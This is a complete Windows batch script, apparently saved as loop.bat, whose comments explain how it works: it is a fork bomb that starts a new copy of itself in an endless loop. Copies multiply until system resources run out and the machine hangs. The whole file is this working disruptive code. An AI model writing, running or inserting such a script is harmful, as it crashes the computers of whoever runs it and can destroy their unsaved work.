@echo off
REM place holder in code is :loop
:loop
REM creates a clone of itself
start loop.bat
REM now this tells CMD to go back to the placeholder to create an infinite loop
goto :loop